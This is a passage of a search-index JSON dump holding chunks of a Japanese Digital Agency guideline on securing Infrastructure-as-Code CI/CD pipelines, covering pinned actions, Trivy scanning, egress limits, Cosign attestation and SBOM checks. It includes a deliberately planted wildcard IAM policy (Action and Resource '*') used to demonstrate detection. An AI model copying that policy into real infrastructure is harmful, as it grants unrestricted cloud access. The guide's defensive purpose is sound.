44：ソー","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":31,"page_to":34,"char_count":1200},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c25","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"\"Allow\", Action = \"*\", Resource = \"*\" } ] }) } 図 45：構成不備の混入\n\n30 こういった構成不備をTrivy で検出することができる。14 % cat .github/workflows/tf-plan.tf jobs: （中略） check-misconfig: name: SAST (misconfig) runs-on: ubuntu-latest permissions: contents: read pull-requests: write steps: - name: Checkout repository uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 - name: trivy uses: aquasecurity/trivy-action@18f2510ee396bbf400402947b394f2dd8c87dbb0 env: TRIVY_DEBUG: 'true' with: version: v0.55.1 scan-type: co","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":33,"page_to":36,"char_count":1231},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c26","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"を必要とするブランチへのレビューのRulesets による 強制などが考えられる。\n\n32 3)ビルド上での実行範囲の制限 図 49：ビルド上での実行範囲の制限 CI 定義ファイルの保護方法および権限の最小化については、パイプラインA と同様のため、ここでは省略する。 パイプラインB のビルドフェーズでは、成果物のビルド、テスト、メタデー タ生成取得、署名検証などのために多種多様なツールを用いる。依存しなけ ればならないTerraform バイナリやAWS Terraform Provider は、プラットフ ォームチームが提供するコンテナイメージを利用する。その安全性の確認に ついては、４.３4)「 依存物の安全性の担保」で説明する。 それ以外の対策としては、意図しないペイロードを取得しないよう、ビル ド環境の外部通信を制限する方法が考えられる。GitHub Actions における外 部ネットワーク通信制限は、オンプレミスのGitHub Enterprise サーバーの利 用以外にも、AWS 上のCodeBuild Project を仮想ネットワーク（AWS VPC）で ホストし、","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":35,"page_to":38,"char_count":1275},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c27","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"CodeBuild に指定する記述\n\n34 図 52：CodeBuild 側のGitHub リポジトリ指定の画面 なお、未検証ではあるが、Azure でも同様の仕組みが提供されているほか、 GitLab もAWS CodeBuild との連携が可能と考えられる。 4) 依存物の安全性の担保 図 53：依存物の安全性の担保 まず、プラットフォームチームの正しいコンテナイメージを取得する必要 がある。厳密なコンテナイメージを取得した場合は、GitHub Actions の外部a アクションを取得するときと同じく、一意のイメージダイジェスト（image digest）を指定することでリスクを低減できる。 また、サービスチームとしては、取得したコンテナイメージの安全性を確 認する必要がある。サービスチームにとっての安全性の定義は本書では省く が、取得した成果物の安全性確認には成果物のメタデータの完全性を確保・ 検証する必要がある。３.３2)「ソースコード・成果物の信頼性の担保」に示 すとおり、プラットフォームチームがコンテナイメージとともにSBOM やSLSA Provenance をメタデー","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":37,"page_to":39,"char_count":1200},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c28","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"checkout@11bd71901bbe5b1630ceea73d27597364c9af683 - name: Install Cosign uses: sigstore/cosign-installer@dc72c7d5c4d10cd6bcb8cf6e3fd625a9e5e537da - name: Login to Amazon ECR id: login-ecr uses: aws-actions/amazon-ecr- login@062b18b96a7aff071d4dc91bc00c4c1a7945b076 with: registries: \"${{ env.AWS_CENTRAL_MANAGED_ACCOUNT }}\" - name: Verify And Obtain ABOM and Attestation run: | IMAGE_DIGEST=\"${{ steps.login-ecr.outputs.registry }}/tf- image@${{ env.IMAGE_DIGEST }}\" cosign verify-attestation $IMAGE_","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":39,"page_to":39,"char_count":1200},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c29","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"ファイルのペイロードをBase64 デコードして、実際のSBOM ファイルを取得する（図 55） 。Trivy でその内容を確認し、脆弱性管理方針に 照らし合わせ、利用可否を判断する。 % cat /tmp/downloaed-verified-sbom.cdx.json {\"payloadType\":\"application/vnd.in-toto+json\",\"payload\":\"eyJfd（略） 0=\",\"signatures\":[{\"keyid\":\"\",\"sig\":\"（略）\"}]} % cat /tmp/downloaed-verified-sbom.cdx.json| jq -r .payload | base64 -d | jq -r .predicate > /tmp/cdx.json % cat .github/workflows/verify-container.tf % trivy sbom /tmp/cdx.json (中略) /tmp/cdx.json (ubuntu 24.04) Total: 14 (UNKNOWN: 0, LOW: 6, MEDIUM: 8","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":39,"page_to":40,"char_count":1240},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c30","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"d Project でGitHub Actions を実行する。ここで保護対象となる主体は、AWS CodeBuild に割り当てられるIAM ロールである。変更内容を適用するためより 強力な権限が必要となるため、ビルド時とは異なるIAM ロール（および CodeBuild プロジェクト）を用意することとなる。なお、これらの手法はパイ プラインB に特有の事項ではないため、本章では詳細を割愛する。 2)信頼できる成果物をデリバリするための保護 すでに検証済みのTfplan ファイルと、その成果物を保管するS3 バケットの セキュリティが適切に確保されていれば、一定の信頼性を担保できる。本章 の範囲外ではあるが、サービスチームの規模拡大や複数ステークホルダーの 関与によって、ビルドフェーズの承認者とデリバリフェーズの承認者など、\n\n37 サービスチーム内の権限構成が異なる場合も想定される。そのような場合は、 第3 章「プラットフォームチームのCI/CD パイプライン」で述べたと同様に、 Tfplan ファイルへの署名やProvenance などのメタデータを生成・検証するプ ロセスを導入","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":40,"page_to":41,"char_count":1200},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c31","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"le-policy\" + name_prefix = (known after apply) + policy = jsonencode( { + Statement = [ + { + Action = \"*\" + Effect = \"Allow\" + Resource = \"*\" }, ] + Version = \"2012-10-17\" } ) + role = \"9e2364d7-6742-0855-f186-7bf225edaf7b-iam-role\" } Plan: 1 to add, 0 to change, 0 to destroy. 図 57：Tfplan から追跡する変更内容 以上。","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":41,"page_to":41,"char_count":305}],"avg_length":1204.384705882353,"k1":1.5,"b":0.75}